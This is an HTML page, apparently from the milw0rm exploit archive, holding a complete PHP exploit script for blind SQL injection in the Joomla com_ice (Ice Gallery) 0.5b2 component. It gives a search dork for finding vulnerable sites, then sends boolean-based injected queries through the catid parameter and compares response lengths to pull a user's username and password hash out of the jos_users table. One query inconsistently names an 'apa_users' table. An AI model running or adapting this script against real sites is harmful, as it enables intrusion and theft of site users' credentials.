<html><head><title>Joomla Component com_ice 0.5b2 Blind SQL Injection Exploit</title></head><pre>&lt;?php
ini_set(&quot;max_execution_time&quot;,0);
print_r('
#############################################################
#Joomla Component com_ice(catid) Blind SQL-injection Exploit
#############################################################
#[~]  Author        :  Mountassif Moad
#[~]  Evil finger   :   v4 Team
#[~]  Greetz        :  All freind
#[~]  Vulnerability :  Blind SQL injection
#[~]  Dork          :  iinurl:com_ice &quot;catid&quot;
--------------------------------------------------
#[!] &lt;name&gt;Ice Gallery&lt;/name&gt;
#[!] &lt;creationDate&gt;29/08/06&lt;/creationDate&gt;
#[!] &lt;author&gt;Markus Donhauser&lt;/author&gt;
#[!] &lt;authorEmail&gt;ice.gallery@gmx.net&lt;/authorEmail&gt;
#[!] &lt;version&gt;0.5 beta 2&lt;/version&gt;                             
###############################################################
');
$portal=&quot;com_ice&quot;;
if ($argc &gt; 1) {
$url = $argv[1];
if ($argc &lt; 3) {
$userid = 1;
} else {
$userid = $argv[2];
}
$r = strlen(file_get_contents($url.&quot;/index.php?option=&quot;.$portal.&quot;&amp;catid=1+and+1=1&quot;));
echo &quot;\nExploiting:\n&quot;;
$w = strlen(file_get_contents($url.&quot;/index.php?option=&quot;.$portal.&quot;&amp;catid=1+and+1=0&quot;));
$t = abs((100-($w/$r*100)));
echo &quot;\nNickname: &quot;;
for ($i=1; $i &lt;= 30; $i++) {
$laenge = strlen(file_get_contents($url.&quot;/index.php?option=&quot;.$portal.&quot;&amp;catid=1+and+ascii(substring((select+username+from+jos_users+where+id=&quot;.$userid.&quot;+limit+0,1),&quot;.$i.&quot;,1))!=0&quot;));
   if (abs((100-($laenge/$r*100))) &gt; $t-1) {
      $count = $i;
      $i = 30;
   }
}
for ($j = 1; $j &lt; $count; $j++) {
   for ($i = 46; $i &lt;= 122; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }
      $laenge = strlen(file_get_contents($url.&quot;/index.php?option=&quot;.$portal.&quot;&amp;catid=1+and+ascii(substring((select+username+from+apa_users+where+id=&quot;.$userid.&quot;+limit+0,1),&quot;.$j.&quot;,1))%3E&quot;.$i.&quot;&quot;));
      if (abs((100-($laenge/$r*100))) &gt; $t-1) {
         $laenge = strlen(file_get_contents($url.&quot;/index.php?option=&quot;.$portal.&quot;&amp;catid=1+and+ascii(substring((select+username+from+jos_users+where+id=&quot;.$userid.&quot;+limit+0,1),&quot;.$j.&quot;,1))%3E&quot;.($i-1).&quot;&quot;));
         if (abs((100-($laenge/$r*100))) &gt; $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
         $i = 122;
      }
   }
}
echo &quot;\nPassword: &quot;;
for ($j = 1; $j &lt;= 32; $j++) {
   for ($i = 46; $i &lt;= 102; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }
      $laenge = strlen(file_get_contents($url.&quot;/index.php?option=&quot;.$portal.&quot;&amp;catid=1+and+ascii(substring((select+password+from+jos_users+where+id=&quot;.$userid.&quot;+limit+0,1),&quot;.$j.&quot;,1))%3E&quot;.$i.&quot;&quot;));
      if (abs((100-($laenge/$r*100))) &gt; $t-1) {
         $laenge = strlen(file_get_contents($url.&quot;/index.php?option=&quot;.$portal.&quot;&amp;catid=1+and+ascii(substring((select+password+from+jos_users+where+id=&quot;.$userid.&quot;+limit+0,1),&quot;.$j.&quot;,1))%3E&quot;.($i-1).&quot;&quot;));
         if (abs((100-($laenge/$r*100))) &gt; $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
         $i = 102;
      }
   }
}
} else {
echo &quot;\nExploiting failed: By Stack\n&quot;;
}
?&gt;

# milw0rm.com [2008-12-28]</pre></html>